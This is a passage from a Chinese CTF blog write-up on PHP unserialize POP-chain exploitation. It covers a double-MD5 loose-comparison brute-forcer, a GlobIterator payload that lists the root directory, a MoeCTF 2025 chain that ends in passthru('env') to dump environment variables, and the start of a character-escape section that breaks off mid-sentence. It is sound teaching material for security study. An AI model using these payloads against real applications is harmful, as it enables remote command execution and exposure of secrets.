<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;fruit4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们观察到该函数为魔术魔方<code>_call()</code>；那么我们就继续想如何才能触发这个<code>__call()</code>；在对象上下文中调用不可访问的方法或不存在的方法时触发<code>__call()</code></p>
<p>再接着源码审计可以看到在 Samurai 这个类中出现了不可访问的方法<code>add()</code> ；此时自然就会触发<code>__call()</code>函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Samurai</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;fruit6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;xxx are the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们观察到该函数为魔术魔方<code>__toString()</code>；那么我们就继续想如何才能触发这个<code>__toString()</code>函数呢？在将对象当作字符串使用时就会触发<code>__toString()</code>；所以此时我们就需要寻找有哪个对象被当作字符串进行调用了</p>
<p>继续审计发现在 CherryBlossom 类中出现了将对象 fruit1 当作字符串进行使用的操作(<code>$newFunc = $this-&gt;fruit2;</code>)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以链就很清晰了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CherryBlossom&#123;__destruct()&#125; --&gt;  Samurai&#123;__toString()&#125; --&gt; Warlord&#123;__call()&#125; --&gt; Philosopher&#123;__invoke()&#125; --&gt; Mystery&#123;__get()&#125;</span><br></pre></td></tr></table></figure>
<p>我们发现在最后一步<code>__get()</code>函数的触发时需要满足</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __invoke() &#123;</span><br><span class="line">        if (md5(md5($this-&gt;fruit11)) == 666) &#123;</span><br><span class="line">            return $this-&gt;fruit10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><strong>双重md5</strong></p>
<p>此时利用到的是双重md5绕过：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># 运行: python2 md5.py &quot;666&quot; 0</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md5</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        md5 = hashlib.md5(rnds)</span><br><span class="line">        value = md5.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value[start: start + str_len] == substr:</span><br><span class="line">            <span class="comment"># print rnds</span></span><br><span class="line">            <span class="comment"># stop_event.set()</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 碰撞双md5</span></span><br><span class="line">            md5 = hashlib.md5(value)</span><br><span class="line">            <span class="keyword">if</span> md5.hexdigest()[start: start + str_len] == substr:</span><br><span class="line">                <span class="built_in">print</span> rnds + <span class="string">&quot;=&gt;&quot;</span> + value + <span class="string">&quot;=&gt;&quot;</span> + md5.hexdigest() + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                stop_event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    start_pos = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                                               stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure>
<p><strong>反序列化之遍历文件目录类</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GlobIterator</span>=<span class="string">&quot;/*&quot;</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//public $SplFileObject=&quot;/flag44545615441084&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">            <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;rSYwGEnSLmJWWqkEARJp&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;fruit1=<span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;fruit1-&gt;fruit2=<span class="keyword">new</span> <span class="title class_">Philosopher</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;fruit1-&gt;fruit2-&gt;fruit10=<span class="keyword">new</span> <span class="title class_">Mystery</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br></pre></td></tr></table></figure>
<h4 id="题目-MoeCTF-2025"><a href="#题目-MoeCTF-2025" class="headerlink" title="题目 - MoeCTF 2025"></a><a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/games/22/challenges?challenge=947">题目 - MoeCTF 2025</a></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="variable">$id</span>(<span class="variable language_">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;name = <span class="variable">$id</span>;</span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$age</span> == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Age can&#x27;t be empty.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$name</span> === <span class="string">&quot;system&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$name</span>(<span class="variable">$age</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable language_">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$person</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到，PersonC有个wakeup需要触发，但是从下面wakeup可以看到，需要满足<code>$name</code>得到的是一个对象（类），但是结合POP链来看，wakeup属于开头，所以需要一个对象，来满足这个wakeup的触发，剩下的就是正常的POP链过程（wakeup -&gt; invoke -&gt; destruct -&gt; check）</p>
<p>EXP：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$name</span>; <span class="keyword">public</span> <span class="variable">$id</span>; <span class="keyword">public</span> <span class="variable">$age</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonB</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonC</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;name = <span class="string">&quot;passthru&quot;</span>; </span><br><span class="line"><span class="variable">$c</span>-&gt;id = <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonA</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;id = <span class="string">&quot;check&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;age = <span class="string">&quot;env&quot;</span>;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LLeaves/p/12813992.html#2. php反序列化字符逃逸">[安洵杯 2019]easy_serialize_php - LLeaves - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44632787/article/details/119185112">安洵杯 2019]easy_serialize_php ———— 反序列化/序列化和代码审计_ctf 反序列化变量覆盖-CSDN博客</a></p>
<p><strong>键值逃逸</strong></p>
<ul>
<li>因为序列化的字符串是严格的，对应的格式不能错，比如s:4:“name”,那s:4就必须有一个字符串长度是4的否则就往后要。</li>
<li>并且反序列化会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号<code>&#123;&#125;</code>外的就都被扔掉。</li>
</ul>
<p>php中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化，但是反序列化是有一定的识别范围的，比如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;a:2:&#123;i:0;s:8:&quot;Hed9eh0g&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;abc&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//array(2) &#123; [0]=&gt; string(8) &quot;Hed9eh0g&quot; [1]=&gt; string(5) &quot;aaaaa&quot; &#125;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;a:2:&#123;i:0;s:8:&quot;Hed9eh0g&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//array(2) &#123; [0]=&gt; string(8) &quot;Hed9eh0g&quot; [1]=&gt; string(5) &quot;aaaaa&quot; &#125;</span></span><br></pre></td></tr></table></figure>
<p>两者运行效果是一样的</p>
<p>按照这题来说，以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;flagflag&quot;]=&#x27;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&#x27;;</span><br><span class="line">$_SESSION[&quot;img&quot;]=&#x27;ZDBnM19mMWFnLnBocA==&#x27;;</span><br><span class="line"></span><br><span class="line">echo serialize($_SESSION);</span><br><span class="line"></span><br><span class="line">//a:2:&#123;s:8:&quot;flagflag&quot;;s:58:&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>而题中代码将flag替换成空，那么结果变为：</p>
